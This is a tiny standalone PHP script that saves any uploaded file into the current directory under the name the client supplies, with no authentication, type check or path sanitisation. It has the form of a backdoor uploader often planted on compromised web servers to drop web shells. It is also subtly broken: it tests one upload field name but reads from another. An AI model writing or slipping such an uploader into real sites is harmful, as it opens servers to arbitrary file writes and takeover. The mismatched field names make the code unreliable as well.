<?php
if(isset($_FILES['file'])){
file_put_contents(getcwd().DIRECTORY_SEPARATOR.$_FILES['file']['name'], file_get_contents($_FILES['upload_file']['tmp_name']));
}
?>